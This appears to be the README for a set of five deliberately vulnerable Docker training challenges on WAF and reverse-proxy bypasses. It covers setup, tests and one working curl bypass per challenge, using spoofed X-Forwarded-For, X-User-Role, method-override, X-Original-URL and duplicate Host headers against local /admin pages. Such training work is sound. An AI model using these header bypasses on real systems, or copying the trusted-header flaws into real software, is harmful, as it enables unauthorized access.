# The HACKERS CHALLENGE - WAF & Middleware Security Vulnerabilities

A collection of 5 WAF (Web Application Firewall) bypass challenges demonstrating common HTTP header manipulation techniques and reverse proxy security issues. Each challenge is a self-contained Docker application showcasing a specific middleware security flaw.

## 🎯 Challenges Overview

| Challenge | Vulnerability | Difficulty | Port |
|-----------|---------------|------------|------|
| [challenge-1](./challenge-1/) | X-Forwarded-For IP Bypass | Easy | 8001 |
| [challenge-2](./challenge-2/) | X-User-Role Header Bypass | Easy | 8002 |
| [challenge-3](./challenge-3/) | HTTP Method Override Bypass | Medium | 8003 |
| [challenge-4](./challenge-4/) | X-Original-URL Path Bypass | Medium | 8004 |
| [challenge-x](./challenge-x/) | Duplicate Host Header Bypass | Hard | 8443 |

## 🚀 Quick Start

### Run Individual Challenge
```bash
cd challenge-1
docker-compose -f docker-compose-dev.yml up --build
# Access at http://localhost:8001
```

### Stop Challenge
```bash
docker-compose -f docker-compose-dev.yml down
```

## 🔍 Vulnerability Types Covered

### 1. **Header Injection Attacks**
- IP spoofing via X-Forwarded-For
- Custom header injection (X-User-Role)
- Method override header manipulation (X-HTTP-Method-Override)
- URL rewrite header bypass (X-Original-URL)

### 2. **Reverse Proxy Bypass**
- nginx path-based access control bypass
- WAF rule evasion through header manipulation
- Internal routing exploitation

### 3. **HTTP Request Smuggling**
- Duplicate Host header attacks
- Header parsing inconsistencies between proxy and application
- SNI validation bypass

### 4. **Authorization Issues**
- IP-based access control bypass
- Role-based authorization weaknesses
- Method-based security control evasion

## 📁 Project Structure

```
HC2025-middleware-santi/
├── challenge-1/                     # X-Forwarded-For bypass
│   ├── app.py                       # Flask application
│   ├── Dockerfile                   # Container config
│   ├── docker-compose-dev.yml       # Development setup
│   ├── requirements.txt             # Python dependencies
│   ├── conf/nginx-dev/              # nginx configuration
│   ├── README.md                    # Challenge instructions
│   ├── SOLUTION.md                  # Step-by-step solution
│   └── .env                         # Flag storage
├── challenge-2/                     # X-User-Role bypass
├── challenge-3/                     # HTTP Method Override bypass
├── challenge-4/                     # X-Original-URL bypass
├── challenge-x/                     # Duplicate Host Header bypass
├── tests/                           # Test suite
│   ├── test_challenge_1.py
│   ├── test_challenge_2.py
│   ├── test_challenge_3.py
│   ├── test_challenge_4.py
│   ├── test_challenge_x.py
│   └── requirements.txt
├── run_tests.sh                     # Test runner script
├── CLAUDE.md                        # Development guidelines
└── README.md                        # This file
```

### Technology Stack
- **Web Framework:** Flask 3.0.0
- **WSGI Server:** Gunicorn 21.2.0
- **Reverse Proxy:** nginx (latest)
- **Containerization:** Docker & docker-compose

## 🚦 Development & Testing

### Debug Endpoints
All applications include `/debug` endpoints for header inspection:
```bash
curl http://localhost:8001/debug
# Returns all request headers
```

### Health Checks
Each challenge has a main page at `/` with instructions:
```bash
curl http://localhost:8001/
# Returns: "The flag is at /admin. You can see some debug stuff at /debug."
```

### Environment Configuration
Each challenge uses `.env` files for flag storage:
```bash
# Example .env
FLAG=HC{simple_bypass}
```

### Docker Management
Challenges can be managed independently:
```bash
# Start challenge
cd challenge-1
docker-compose -f docker-compose-dev.yml up --build

# Stop challenge
docker-compose -f docker-compose-dev.yml down

# View logs
docker-compose -f docker-compose-dev.yml logs -f
```

## 🧪 Testing Framework

The project includes a comprehensive test suite (100+ test cases) that:
- Automatically starts/stops Docker services
- Tests vulnerability exploitation paths
- Validates security boundaries
- Ensures bypass techniques work as intended
- Provides detailed reporting with colored output

### Run All Tests
```bash
./run_tests.sh
```

### Run Individual Challenge Tests
```bash
./run_tests.sh 1   # Challenge 1 only
./run_tests.sh 2   # Challenge 2 only
./run_tests.sh 3   # Challenge 3 only
./run_tests.sh 4   # Challenge 4 only
./run_tests.sh x   # Challenge X only
```

### Manual Testing Examples

#### Challenge 1: X-Forwarded-For Bypass
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:8001/admin
```

#### Challenge 2: X-User-Role Bypass
```bash
curl -H "X-User-Role: admin" http://localhost:8002/admin
```

#### Challenge 3: HTTP Method Override Bypass
```bash
curl -X POST -H "X-HTTP-Method-Override: GET" http://localhost:8003/admin
```

#### Challenge 4: X-Original-URL Bypass
```bash
curl -H "X-Original-URL: /admin" http://localhost:8004/public
```

#### Challenge X: Duplicate Host Header Bypass
```bash
curl -k -H "Host: localhost" -H "Host: admin.local" https://localhost:8443/admin
```
